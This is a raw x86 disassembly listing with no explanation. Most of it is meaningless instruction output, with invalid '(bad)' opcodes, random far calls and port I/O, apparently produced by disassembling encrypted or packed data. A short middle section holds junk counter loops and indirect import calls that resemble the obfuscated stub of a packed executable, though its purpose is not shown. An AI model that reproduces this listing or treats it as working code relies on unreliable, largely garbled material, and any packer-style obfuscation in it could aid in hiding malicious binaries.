  40ab11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab12:	or     cl,BYTE PTR ds:0x3ac61257
  40ab18:	icebp  
  40ab19:	out    dx,eax
  40ab1a:	repz sbb al,ch
  40ab1d:	xchg   edi,eax
  40ab1e:	test   eax,0xe8c495ee
  40ab23:	ss inc ecx
  40ab25:	(bad)  
  40ab27:	mov    bl,0x9
  40ab29:	ficomp DWORD PTR [ecx-0x6c]
  40ab2c:	mov    ebx,DWORD PTR [edi+ecx*2+0x152332b3]
  40ab33:	xchg   ebp,esp
  40ab35:	daa    
  40ab36:	out    0x36,eax
  40ab38:	test   eax,0x862fb18d
  40ab3d:	jns    0x40ab0b
  40ab3f:	dec    edx
  40ab40:	stos   DWORD PTR es:[edi],eax
  40ab41:	clc    
  40ab42:	(bad)  
  40ab43:	cmp    al,0xe8
  40ab45:	push   cs
  40ab46:	sbb    al,0xe4
  40ab48:	and    eax,0xbd44bf45
  40ab4d:	in     al,0x81
  40ab4f:	push   0x44
  40ab51:	in     al,dx
  40ab52:	arpl   WORD PTR [eax],bx
  40ab54:	fld    DWORD PTR [eax-0x4d]
  40ab57:	pushf  
  40ab58:	cwde   
  40ab59:	mov    bh,0x69
  40ab5b:	cmp    eax,0xffe0253e
  40ab60:	cmp    al,0x30
  40ab62:	(bad)  
  40ab63:	es push edx
  40ab65:	mov    edi,0x99b41b95
  40ab6a:	(bad)
  40ab6e:	jb     0x40ab13
  40ab70:	sbb    al,0x8b
  40ab72:	xor    dh,BYTE PTR [esi-0x4e]
  40ab75:	mov    ds:0xa04c4d3f,al
  40ab7a:	data16 adc cl,BYTE PTR [ecx+ecx*4]
  40ab7e:	popa   
  40ab7f:	int3   
  40ab80:	imul   eax,DWORD PTR [edi-0x534ecbbc],0xffffffd8
  40ab87:	inc    ebx
  40ab88:	out    0x52,eax
  40ab8a:	mov    esi,0x157a25e8
  40ab8f:	adc    eax,0x81b4338e
  40ab94:	vmread DWORD PTR [esi],edi
  40ab97:	mov    DWORD PTR [esi-0x71],esi
  40ab9a:	xlat   BYTE PTR ds:[ebx]
  40ab9b:	push   ebx
  40ab9c:	cli    
  40ab9d:	mov    es,WORD PTR [edi]
  40ab9f:	mov    BYTE PTR [edi],0x96
  40aba2:	mov    esp,0xe1eddf01
  40aba7:	sub    al,0x33
  40aba9:	mov    bh,0x31
  40abab:	cwde   
  40abac:	ror    esp,cl
  40abae:	icebp  
  40abaf:	aad    0x10
  40abb1:	sti    
  40abb2:	repz popa 
  40abb4:	xchg   esp,eax
  40abb5:	dec    ebx
  40abb6:	leave  
  40abb7:	mov    ebp,0xf5be0439
  40abbc:	sti    
  40abbd:	pusha  
  40abbe:	cwde   
  40abbf:	rcl    DWORD PTR [edi+0x2fbff85c],1
  40abc5:	mov    WORD PTR [edi+0x468979d5],fs
  40abcb:	cwde   
  40abcc:	sub    DWORD PTR [ebx],edx
  40abce:	xchg   esi,eax
  40abcf:	enter  0x7654,0xa9
  40abd3:	call   0xe9d9:0x1a1a
  40abd9:	sub    ch,0x20
  40abdc:	mov    ebp,0xa11cad09
  40abe2:	das    
  40abe3:	mov    al,ds:0x48777002
  40abe8:	and    eax,ebp
  40abea:	sbb    dh,BYTE PTR [ebx+0x2c92d9e]
  40abf0:	loopne 0x40ac6b
  40abf2:	pop    ds
  40abf3:	dec    eax
  40abf4:	stos   BYTE PTR es:[edi],al
  40abf5:	jge    0x40ac14
  40abf7:	pushf  
  40abf8:	aas    
  40abf9:	call   0xc08f:0x8c76535
  40ac00:	or     ebp,DWORD PTR [edx-0x75934cca]
  40ac06:	ret    
  40ac07:	nop
  40ac08:	xor    DWORD PTR [ecx+esi*4-0x71d0df9d],esi
  40ac0f:	out    dx,al
  40ac10:	dec    esi
  40ac11:	call   0x1951:0x30977279
  40ac18:	jge    0x40ac22
  40ac1a:	sub    eax,0xbe340c96
  40ac1f:	out    0x28,eax
  40ac21:	dec    edx
  40ac22:	call   0x797ef385
  40ac27:	ja     0x40abea
  40ac29:	in     al,0x5e
  40ac2b:	pop    ebp
  40ac2c:	call   0x6f21:0x494a695b
  40ac33:	bound  ebp,QWORD PTR [esp+ecx*8+0x1a]
  40ac37:	fistp  WORD PTR [edx]
  40ac39:	fidivr WORD PTR [edi+eax*4-0xf]
  40ac3d:	into   
  40ac3e:	stos   DWORD PTR es:[edi],eax
  40ac3f:	call   0xea70:0x7ac4532d
  40ac46:	push   cs
  40ac47:	cld    
  40ac48:	sti    
  40ac49:	bnd ret 
  40ac4b:	inc    ecx
  40ac4c:	xor    bh,BYTE PTR [ebp+0x32]
  40ac4f:	je     0x40ac13
  40ac51:	inc    esp
  40ac52:	sub    ecx,DWORD PTR [edi-0x2a]
  40ac55:	sbb    ecx,esi
  40ac57:	jl     0x40ac0e
  40ac59:	xor    eax,0xe523c7ee
  40ac5e:	add    eax,0xa6344646
  40ac63:	push   edi
  40ac64:	test   bh,bl
  40ac66:	jmp    0x40abf6
  40ac68:	out    0x68,eax
  40ac6a:	mov    edx,0x5436eb94
  40ac6f:	jge    0x40acab
  40ac71:	out    0xd5,eax
  40ac73:	stos   DWORD PTR es:[edi],eax
  40ac74:	sbb    eax,esi
  40ac76:	dec    esi
  40ac77:	gs aas 
  40ac79:	ds sub edx,edi
  40ac7c:	push   ecx
  40ac7d:	add    DWORD PTR [ebp+esi*2-0x71d221c8],ecx
  40ac84:	cmp    BYTE PTR [eax+ecx*2],ah
  40ac87:	loope  0x40ac7b
  40ac89:	xchg   esp,eax
  40ac8a:	jnp    0x40ac9e
  40ac8c:	into   
  40ac8d:	jne    0x40ac47
  40ac8f:	dec    ebp
  40ac90:	pmulhuw mm0,QWORD PTR [ebx-0x2c]
  40ac94:	xchg   esp,eax
  40ac95:	les    ebp,FWORD PTR [ebp-0x6ea50b18]
  40ac9b:	pusha  
  40ac9c:	nop
  40ac9d:	jmp    0xefc1:0xe304ff01
  40aca4:	std    
  40aca5:	pop    ss
  40aca6:	stos   DWORD PTR es:[edi],eax
  40aca7:	and    BYTE PTR [eax],bh
  40aca9:	xchg   DWORD PTR ds:0xe7077fea,ebx
  40acaf:	ret    0x6b2b
  40acb2:	sub    BYTE PTR [ecx+0x66],ch
  40acb5:	addr16 jge 0x1edaaac1
  40acbc:	mov    ds:0xb592834,eax
  40acc1:	popf   
  40acc2:	xor    DWORD PTR [esi-0x5a],0xffffffb5
  40acc6:	or     al,0x53
  40acc8:	fsub   QWORD PTR [esi-0x1d]
  40accb:	or     ebx,DWORD PTR [edi+0x6d8f767]
  40acd1:	nop
  40acd2:	add    dh,ah
  40acd4:	ret    0x4c9
  40acd7:	jge    0x40ad15
  40acd9:	mov    dl,0x4f
  40acdb:	pop    ecx
  40acdc:	or     BYTE PTR [ebx],dl
  40acde:	cwde   
  40acdf:	gs (bad) 
  40ace3:	daa    
  40ace4:	push   cs
  40ace5:	(bad)  
  40ace6:	dec    ebp
  40ace7:	jg     0x40ad52
  40ace9:	mov    bl,0xe5
  40aceb:	mov    eax,ds:0xeabcd2d3
  40acf0:	xor    esi,ebx
  40acf2:	ins    BYTE PTR es:[edi],dx
  40acf3:	pop    ecx
  40acf4:	mov    dl,dh
  40acf6:	les    ebx,FWORD PTR [eax+0x5b]
  40acf9:	cmp    al,BYTE PTR [edx]
  40acfb:	call   0x44667d9d
  40ad00:	mov    eax,0xf85637f7
  40ad05:	sub    al,0xb
  40ad07:	mov    ebp,0x5238aa1e
  40ad0c:	push   esi
  40ad0d:	mov    ebx,0xbf6491a5
  40ad12:	mov    bl,0xdd
  40ad14:	in     eax,0x99
  40ad16:	sbb    DWORD PTR [ebx-0x3c0c1801],eax
  40ad1c:	push   ss
  40ad1d:	pop    esi
  40ad1e:	rcr    DWORD PTR ds:0xd0b4651f,cl
  40ad24:	pop    eax
  40ad25:	inc    edx
  40ad26:	jae    0x40accf
  40ad28:	jb     0x40ad62
  40ad2a:	mov    esp,0x18d8a69b
  40ad2f:	fucomp st(1)
  40ad31:	into   
  40ad32:	outs   dx,BYTE PTR ds:[esi]
  40ad33:	sbb    al,0xad
  40ad35:	mov    ?,WORD PTR [eax-0xca98578]
  40ad3b:	loopne 0x40ad11
  40ad3d:	cmp    DWORD PTR [edi-0x2bfed73d],0x56
  40ad44:	xor    DWORD PTR [esi],0x6b8811f1
  40ad4a:	jno    0x40ad7e
  40ad4c:	pop    ss
  40ad4d:	dec    edi
  40ad4e:	jle    0x40ad3d
  40ad50:	lods   al,BYTE PTR ds:[esi]
  40ad51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad52:	inc    ebp
  40ad53:	and    ebp,DWORD PTR [ecx+eax*8+0xc5fffa0]
  40ad5a:	cmp    cl,0xe3
  40ad5d:	(bad)  
  40ad5f:	or     al,BYTE PTR [esi]
  40ad61:	outs   dx,DWORD PTR ds:[esi]
  40ad62:	adc    ebp,DWORD PTR [ebx]
  40ad64:	xor    BYTE PTR [edi-0x4224b84e],cl
  40ad6a:	cli    
  40ad6b:	rol    BYTE PTR [edx+esi*4+0x31e3b18e],1
  40ad72:	pop    esi
  40ad73:	adc    esi,DWORD PTR [ecx+0x4468c320]
  40ad79:	je     0x40adc5
  40ad7b:	sub    ebp,DWORD PTR [ecx]
  40ad7d:	xchg   BYTE PTR [ecx+0x64abdde6],cl
  40ad83:	cld    
  40ad84:	xchg   ecx,eax
  40ad85:	rcr    dh,0x1f
  40ad88:	xchg   ch,cl
  40ad8a:	inc    ebp
  40ad8b:	in     eax,dx
  40ad8c:	sub    BYTE PTR gs:[ebx+0x18f14ab8],ch
  40ad93:	lods   al,BYTE PTR ds:[esi]
  40ad94:	push   edi
  40ad95:	js     0x40ad4b
  40ad97:	es imul eax,edx,0x31
  40ad9b:	jnp    0x40add1
  40ad9d:	xchg   edi,eax
  40ad9e:	mov    ebp,0xec99374b
  40ada3:	(bad)  
  40ada5:	jae    0x40ad51
  40ada7:	xchg   BYTE PTR [edi],cl
  40ada9:	shr    bh,0xc7
  40adac:	jmp    0xc84d:0xc6c0f1a7
  40adb3:	jp     0x40adb5
  40adb5:	pop    ss
  40adb6:	outs   dx,BYTE PTR ds:[esi]
  40adb7:	mov    eax,ds:0xbbc0c06c
  40adbc:	(bad)  
  40adbe:	sub    DWORD PTR [ecx-0x7711ced4],esp
  40adc4:	test   DWORD PTR ds:0xeb269204,0x8d12711a
  40adce:	bound  ecx,QWORD PTR [eax+0x7c]
  40add1:	aas    
  40add2:	int3   
  40add3:	mov    edx,0xcb8997f
  40add8:	aam    0xf4
  40adda:	gs push eax
  40addc:	scas   eax,DWORD PTR es:[edi]
  40addd:	loope  0x40ad6f
  40addf:	fwait
  40ade0:	sub    ah,BYTE PTR [esi]
  40ade2:	fdiv   st(7),st
  40ade4:	aad    0x7d
  40ade6:	cmp    eax,0x14f30f5
  40adeb:	xor    eax,0x79163313
  40adf0:	xchg   edx,eax
  40adf1:	aam    0x4b
  40adf3:	and    BYTE PTR [eax-0x72],dh
  40adf6:	mov    bh,BYTE PTR es:[ebp-0x5b]
  40adfa:	shr    BYTE PTR [eax],cl
  40adfc:	fild   QWORD PTR [eax]
  40adfe:	cmp    BYTE PTR [ecx],al
  40ae00:	push   esi
  40ae01:	imul   edi,DWORD PTR [eax],0xffffffb3
  40ae04:	shl    BYTE PTR [edi],cl
  40ae06:	sar    DWORD PTR [edi+0x26],cl
  40ae09:	inc    eax
  40ae0a:	imul   ebx,DWORD PTR [ecx-0x1f],0xffffff87
  40ae0e:	pop    ebp
  40ae0f:	sub    ebp,ebp
  40ae11:	aad    0x29
  40ae13:	mov    edi,0xe4773941
  40ae18:	sbb    ah,BYTE PTR [ecx-0x31004eda]
  40ae1e:	push   edx
  40ae1f:	test   eax,0x95cbd218
  40ae24:	dec    edi
  40ae25:	cmp    bl,BYTE PTR [edx]
  40ae27:	xchg   DWORD PTR [edi-0x7c],edx
  40ae2a:	push   esi
  40ae2b:	push   ebx
  40ae2c:	push   edi
  40ae2d:	or     eax,0xde0be69f
  40ae32:	xchg   esp,eax
  40ae33:	pop    es
  40ae34:	repz and esi,edx
  40ae37:	jecxz  0x40ae47
  40ae39:	cmp    BYTE PTR [edi],dh
  40ae3b:	jb     0x40ae4a
  40ae3d:	aad    0xb0
  40ae3f:	add    al,0x71
  40ae41:	(bad)  
  40ae43:	pop    ds
  40ae44:	inc    eax
  40ae45:	jne    0x40aeb7
  40ae47:	pop    ebx
  40ae48:	sbb    DWORD PTR [ecx+0x3552130d],ebp
  40ae4e:	mov    ecx,0x878a7e71
  40ae53:	sbb    eax,ebp
  40ae55:	aam    0x61
  40ae57:	(bad)  
  40ae58:	xor    DWORD PTR [edx],edi
  40ae5a:	pop    es
  40ae5b:	out    0x4,al
  40ae5d:	mov    ds:0xf228e7da,al
  40ae62:	cwde   
  40ae63:	jae    0x40aee2
  40ae65:	jae    0x40ae3c
  40ae67:	push   ss
  40ae68:	test   al,0xbd
  40ae6a:	mov    edx,0x3d4d7caf
  40ae6f:	pusha  
  40ae70:	jne    0x40adfc
  40ae72:	stos   BYTE PTR es:[edi],al
  40ae73:	pushf  
  40ae74:	and    edx,DWORD PTR [esi+0x444bdd9e]
  40ae7a:	and    eax,0x1c1c7f71
  40ae7f:	dec    ebp
  40ae80:	push   ebx
  40ae81:	add    eax,0xca947b25
  40ae86:	adc    BYTE PTR [esi],bl
  40ae88:	mov    eax,0xd279b64d
  40ae8d:	cdq    
  40ae8e:	mov    ebx,0x7ddbfd8a
  40ae93:	cwde   
  40ae94:	lahf   
  40ae95:	mov    ecx,0x81118d64
  40ae9a:	sub    eax,0xf76ab753
  40ae9f:	pop    eax
  40aea0:	retf   0x4578
  40aea3:	xor    DWORD PTR [edx+0x62],0xffffff82
  40aea7:	retf   
  40aea8:	stc    
  40aea9:	mov    ebp,0x267d36f0
  40aeae:	inc    ebp
  40aeaf:	cmp    al,0x7a
  40aeb1:	(bad)  
  40aeb3:	mov    eax,ds:0xf2a82566
  40aeb8:	inc    edx
  40aeb9:	jae    0x40ae3f
  40aebb:	jns    0x40aef7
  40aebd:	inc    edx
  40aebe:	adc    BYTE PTR [ebp-0x21aada6a],bh
  40aec4:	xor    al,0xc3
  40aec6:	pop    ebp
  40aec7:	push   ebp
  40aec8:	adc    BYTE PTR [edx],dh
  40aeca:	out    dx,al
  40aecb:	jb     0x40ae93
  40aecd:	xchg   BYTE PTR [ecx+0xfd103e1],bl
  40aed3:	scas   eax,DWORD PTR es:[edi]
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x4344d3
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x4344c7,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x4344bf,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x43457f,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43450f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x43446f,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x4344bb,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x4344c7,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x4344c7
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x4344c7,ebx
  40af4d:	cmp    DWORD PTR ds:0x4344c7,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x4344c7,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x4344f7
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43450b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434593,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434593
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434593,ebx
  40afaa:	cmp    DWORD PTR ds:0x434593,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434593,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	(bad)  
  40affc:	fstp   DWORD PTR [eax-0x3]
  40afff:	idiv   dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	add    bh,cl
  40b009:	sub    ebp,eax
  40b00b:	icebp  
  40b00c:	aad    0x7
  40b00e:	cld    
  40b00f:	pushf  
  40b010:	sub    DWORD PTR [edi],0x51
  40b013:	inc    esp
  40b014:	jae    0x40afb4
  40b016:	(bad)  
  40b017:	repnz mov edi,0xbe069c43
  40b01d:	lods   al,BYTE PTR ds:[esi]
  40b01e:	mov    ah,0x6a
  40b020:	and    BYTE PTR [esi],0x3d
  40b023:	push   es
  40b024:	cmp    esi,edx
  40b026:	imul   BYTE PTR [eax+ebx*4]
  40b029:	jmp    0xdbf3:0xb7c8d791
  40b030:	mov    eax,ds:0xd6473435
  40b035:	mov    eax,0x891cedf1
  40b03a:	arpl   WORD PTR ds:0x9241800e,bx
  40b040:	xlat   BYTE PTR ds:[ebx]
  40b042:	loop   0x40afde
  40b044:	shr    BYTE PTR [edx+0xa037df5],0xf4
  40b04b:	jmp    0xab06:0x850f0364
  40b052:	push   edx
  40b053:	loopne 0x40aff6
  40b055:	adc    bl,BYTE PTR [edi]
  40b057:	enter  0x9304,0x13
  40b05b:	add    ebp,0x67
  40b05e:	out    dx,eax
  40b05f:	pop    ebx
  40b060:	jp     0x40b040
  40b062:	sbb    ebp,DWORD PTR [ebx-0x24447f2e]
  40b068:	mov    ds:0xf1e7d284,eax
  40b06d:	dec    esp
  40b06e:	jmp    0x40b0ab
  40b070:	clc    
  40b071:	cmp    BYTE PTR [ecx-0x7a],0x3c
  40b075:	out    0xa4,eax
  40b077:	dec    ebp
  40b078:	sbb    ecx,DWORD PTR [eax-0x10]
  40b07b:	xor    ah,BYTE PTR [esi+0x6c]
  40b07e:	cwde   
  40b07f:	mov    al,0x2e
  40b081:	or     DWORD PTR [edx],eax
  40b083:	cmc    
  40b084:	jl     0x40b032
  40b086:	test   al,0x10
  40b088:	out    0xd0,al
  40b08a:	outs   dx,DWORD PTR ds:[esi]
  40b08b:	jp     0x40b02f
  40b08d:	jl     0x40b08e
  40b08f:	inc    eax
  40b090:	mov    eax,0x972e22d6
  40b095:	add    ebp,esp
  40b097:	icebp  
  40b098:	jp     0x40b07e
  40b09a:	add    eax,0x55c0445b
  40b09f:	jg     0x40b08e
  40b0a1:	and    eax,DWORD PTR [edx+edx*2]
  40b0a4:	mov    al,ds:0xf415440
  40b0a9:	out    dx,eax
  40b0aa:	and    esi,DWORD PTR [edx]
  40b0ac:	mov    eax,ds:0xd1b24e70
  40b0b1:	(bad)  [edi-0x8]
  40b0b4:	out    0xbf,al
  40b0b6:	rol    BYTE PTR [edi],0x83
  40b0b9:	shl    BYTE PTR [ebp+0xb],1
  40b0bc:	out    0xe,eax
  40b0be:	fisub  WORD PTR [edi+0x5418f470]
  40b0c4:	call   0xc334:0xb834e03c
  40b0cb:	mov    bh,0x75
  40b0cd:	sub    al,0x7
  40b0cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0d0:	pop    es
  40b0d1:	adc    BYTE PTR [edi+ecx*2],bh
  40b0d4:	shl    DWORD PTR [edx],cl
  40b0d6:	(bad)  
  40b0d7:	mov    dh,0xde
  40b0d9:	stos   DWORD PTR es:[edi],eax
  40b0da:	adc    eax,ebx
  40b0dc:	add    cl,BYTE PTR [edx]
  40b0de:	fstp   QWORD PTR [edx+ebx*4-0x193803a3]
  40b0e5:	inc    ecx
  40b0e6:	and    bh,BYTE PTR [esi+0x23]
  40b0e9:	jo     0x40b13d
  40b0eb:	pop    edx
  40b0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0ed:	mov    ebx,0x6dc44b6a
  40b0f2:	mov    ebx,0x3e05b2c7
  40b0f7:	jbe    0x40b0cf
  40b0f9:	retf   0xc954
  40b0fc:	push   ecx
  40b0fd:	xchg   ebp,eax
  40b0fe:	lea    edx,[eax-0x30]
  40b101:	sub    al,BYTE PTR [ecx]
  40b103:	inc    ebx
  40b104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b105:	xchg   edx,eax
  40b106:	dec    esp
  40b107:	int3   
  40b108:	dec    edx
  40b109:	ja     0x40b13d
  40b10b:	jns    0x40b0a1
  40b10d:	jno    0x40b0c9
  40b10f:	mov    bl,0x29
  40b111:	xchg   ebx,eax
  40b112:	jge    0x40b15f
  40b114:	addr16 inc eax
  40b116:	inc    eax
  40b117:	call   0x82cd:0x9f629d52
  40b11e:	test   DWORD PTR [ebx],esi
  40b120:	mov    ebx,0xc902203b
  40b125:	inc    ecx
  40b126:	sbb    edi,DWORD PTR [ecx+0x44]
  40b129:	cmp    eax,0xec34786a
  40b12e:	mov    ecx,0x6dbc8447
  40b133:	and    BYTE PTR [edx+0x25],al
  40b136:	rcr    BYTE PTR [edx+ebp*8],cl
  40b139:	test   edx,edi
  40b13b:	sbb    dl,bl
  40b13d:	sbb    eax,0xa2e0e256
  40b142:	and    bh,BYTE PTR [ebx]
  40b144:	jb     0x40b1a4
  40b146:	ret    
  40b147:	lods   al,BYTE PTR ds:[esi]
  40b148:	jmp    0x40b192
  40b14a:	cs inc esp
  40b14c:	nop
  40b14d:	jle    0x40b182
  40b14f:	je     0x40b1bd
  40b151:	xchg   ecx,eax
  40b152:	pop    ebp
  40b153:	hlt    
  40b154:	pushf  
  40b155:	out    dx,al
  40b156:	sbb    cl,BYTE PTR [edi]
  40b158:	mov    ds:0x74a88bd2,al
  40b15d:	(bad)  
  40b15e:	jo     0x40b1d6
  40b160:	ja     0x40b12d
  40b162:	jbe    0x40b0e7
  40b164:	and    DWORD PTR [ebx+0x89780b],ebx
  40b16a:	bound  ecx,QWORD PTR [esi]
  40b16c:	xor    esp,esp
  40b16e:	outs   dx,BYTE PTR ds:[esi]
  40b16f:	dec    DWORD PTR [ebx]
  40b171:	imul   ecx,DWORD PTR [ebx+0x3d],0xccbf657f
  40b178:	mov    eax,eax
  40b17a:	xor    eax,0x72e98b48
  40b17f:	jbe    0x40b117
  40b181:	xchg   DWORD PTR ds:0x56ea31a6,edx
  40b187:	dec    eax
  40b188:	mov    esp,0x7e4bfab5
  40b18d:	pushf  
  40b18e:	cmp    ebp,DWORD PTR [eax+0x7fed4ca0]
  40b194:	jecxz  0x40b1fe
  40b196:	cmp    ah,dh
  40b198:	jae    0x40b1ab
  40b19a:	outs   dx,BYTE PTR ds:[esi]
  40b19b:	inc    esi
  40b19c:	add    al,0x68
  40b19e:	stos   BYTE PTR es:[edi],al
  40b19f:	add    BYTE PTR [eax],bh
  40b1a1:	mov    ds:0xe463efb5,al
  40b1a6:	shl    DWORD PTR [eax+ebp*8-0x314e97a3],1
  40b1ad:	enter  0xb8ec,0x8b
  40b1b1:	cmp    eax,0xfd52601f
  40b1b6:	cmc    
  40b1b7:	test   ch,0x3b
  40b1ba:	xor    BYTE PTR ds:0x9fbb747,0x80
  40b1c1:	stos   BYTE PTR es:[edi],al
  40b1c2:	pop    ebp
  40b1c3:	sti    
  40b1c4:	mov    ch,0xc2
  40b1c6:	dec    ebp
  40b1c7:	psrld  mm7,QWORD PTR [eax]
  40b1ca:	adc    eax,esp
  40b1cc:	jp     0x40b191
  40b1ce:	pop    eax
  40b1cf:	fcomp  st(6)
  40b1d1:	add    esi,edx
  40b1d3:	repz cs jnp 0x40b1e3
  40b1d7:	cmc    
  40b1d8:	fidiv  WORD PTR [ebx+0x70]
  40b1db:	sub    DWORD PTR [ebp-0x52a2449a],edi
  40b1e1:	test   eax,0x9f533400
  40b1e6:	add    esp,DWORD PTR [edx-0x116996f5]
  40b1ec:	sbb    ebp,ebp
  40b1ee:	xor    bl,BYTE PTR [ecx]
  40b1f0:	sbb    cl,BYTE PTR [ecx+0x4c]
  40b1f3:	jp     0x40b1d1
  40b1f5:	jne    0x40b1e2
  40b1f7:	aas    
  40b1f8:	push   eax
  40b1f9:	push   esi
  40b1fa:	jl     0x40b1b6
  40b1fc:	fs dec ebp
  40b1fe:	cmp    esp,0xbe1c739f
  40b204:	sub    al,0x46
  40b206:	int    0xa
  40b208:	int    0xa4
  40b20a:	mov    al,ds:0x6cebcc0a
  40b20f:	scas   eax,DWORD PTR es:[edi]
  40b210:	cli    
  40b211:	mov    cl,0x20
  40b213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b214:	icebp  
  40b215:	fnstcw WORD PTR [esi]
  40b217:	fnsave [edi+0x3c]
  40b21a:	inc    ebp
  40b21b:	sbb    edi,DWORD PTR [edi]
  40b21d:	xchg   ecx,eax
  40b21e:	mov    ds:0xd2b1e803,al
  40b223:	xor    esi,DWORD PTR [esi+0x55]
  40b226:	fcmovnb st,st(5)
  40b228:	sbb    al,0xd6
  40b22a:	dec    esi
  40b22b:	(bad)  
  40b22c:	mov    ds:0xb910b753,eax
  40b231:	mov    bh,0xab
  40b233:	stc    
  40b234:	js     0x40b206
  40b236:	sar    BYTE PTR [ebp+0x24491d63],0x8d
  40b23d:	cmp    DWORD PTR [edx-0x34da1671],ebx
  40b243:	adc    dl,BYTE PTR [edi+0x236de355]
  40b249:	jne    0x40b2ba
  40b24b:	add    BYTE PTR ds:0x5990c167,ch
  40b251:	arpl   WORD PTR [ebx],di
  40b253:	mov    edx,DWORD PTR [ecx]
  40b255:	in     eax,dx
  40b256:	jl     0x40b1e9
  40b258:	or     al,0xc8
  40b25a:	mov    ecx,0xd2af17e0
  40b25f:	inc    ebp
  40b260:	inc    ebx
  40b261:	mov    al,0x5f
  40b263:	call   0x40344d32
  40b268:	icebp  
  40b269:	mov    bl,bh
  40b26b:	scas   eax,DWORD PTR es:[edi]
  40b26c:	out    0x4f,al
  40b26e:	pop    edi
  40b26f:	add    eax,0xd360e158
  40b274:	adc    ah,bh
  40b276:	sub    edx,DWORD PTR [eax-0x61]
  40b279:	shl    eax,cl
  40b27b:	sbb    eax,edi
  40b27d:	scas   eax,DWORD PTR es:[edi]
  40b27e:	addr16 hlt 
  40b280:	shr    BYTE PTR [edx],0xed
  40b283:	retf   0xdff8
  40b286:	xor    BYTE PTR ds:0x3f65d60c,bh
  40b28c:	lock sbb DWORD PTR [ebx+0x36e39ce7],0x815d551f
  40b297:	gs push edx
  40b299:	push   esp
  40b29a:	push   ss
  40b29b:	fistp  DWORD PTR [ebp+0x77]
  40b29e:	xlat   BYTE PTR ds:[ebx]
  40b29f:	sbb    DWORD PTR [ebx+0x60bcb0a2],edi
  40b2a5:	mov    cl,0x7b
  40b2a7:	xchg   edi,eax
  40b2a8:	pop    edx
  40b2a9:	dec    ebp
  40b2aa:	fs add al,0x8f
  40b2ad:	sub    eax,0x1f734978
  40b2b2:	aam    0x56
  40b2b4:	cwde   
  40b2b5:	int    0xed
  40b2b7:	mov    dh,0xff
  40b2b9:	mov    eax,0xc085f4f6
  40b2be:	std    
  40b2bf:	in     eax,dx
  40b2c0:	mov    edx,0x619058b
  40b2c5:	xchg   edx,eax
  40b2c6:	sbb    eax,DWORD PTR [esi]
  40b2c8:	xor    BYTE PTR [esi-0x43d912fb],dl
  40b2ce:	jmp    0x40b332
  40b2d0:	in     al,dx
  40b2d1:	mov    dh,0xed
  40b2d3:	pop    ebx
  40b2d4:	es (bad) 
  40b2d7:	xchg   edi,eax
  40b2d8:	push   ecx
  40b2d9:	cdq    
  40b2da:	xor    edx,DWORD PTR [esi+eiz*8]
  40b2dd:	jge    0x40b288
  40b2df:	pop    ebp
  40b2e0:	pusha  
  40b2e1:	xor    bh,ah
  40b2e3:	mov    ds,edx
  40b2e5:	push   ebx
  40b2e6:	loopne 0x40b2b4
  40b2e8:	shl    BYTE PTR [eax],1
  40b2ea:	sbb    eax,0x5934b2f0
  40b2ef:	pusha  
  40b2f0:	or     eax,0xaeb41125
  40b2f5:	out    0xd1,al
  40b2f7:	xchg   ebp,eax
  40b2f8:	pop    ds
  40b2f9:	cmp    BYTE PTR [edx+0x27],dh
  40b2fc:	push   ebx
  40b2fd:	jo     0x40b340
  40b2ff:	xchg   edi,eax
  40b300:	cli    
  40b301:	sbb    ah,BYTE PTR [edx+0xc]
  40b304:	mov    DWORD PTR [edx],eax
  40b306:	lahf   
  40b307:	xchg   ecx,eax
  40b308:	xlat   BYTE PTR ds:[ebx]
  40b309:	add    DWORD PTR [eax+0x3a],ecx
  40b30c:	shr    DWORD PTR [ecx],0x79
